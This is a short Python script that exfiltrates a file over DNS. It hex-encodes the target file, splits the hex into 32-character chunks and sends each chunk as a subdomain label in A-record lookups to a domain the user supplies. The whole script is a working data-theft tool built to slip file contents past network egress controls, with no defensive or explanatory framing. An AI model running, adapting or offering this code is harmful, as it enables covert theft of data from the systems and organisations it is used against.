#!/bin/python3

import client
import argparse
import binascii

parser = argparse.ArgumentParser(description = 'File')
parser.add_argument('domain', metavar='Domain', nargs=1, help='Domain to extract to')
parser.add_argument('filename', metavar='Filename', nargs=1, help='Target file to extract')

args = parser.parse_args()

with open(args.filename[0], 'rb') as file:
	content = file.read()

hex = str(binascii.hexlify(content))[2:-1]

n = 32
deliverables = [hex[i:i+n] for i in range(0, len(hex), n)]

for deliverable in deliverables:
	query = str(client.query(deliverable + "." + args.domain[0], "A"))
	print(deliverable + "." + args.domain[0] + ": " + query)
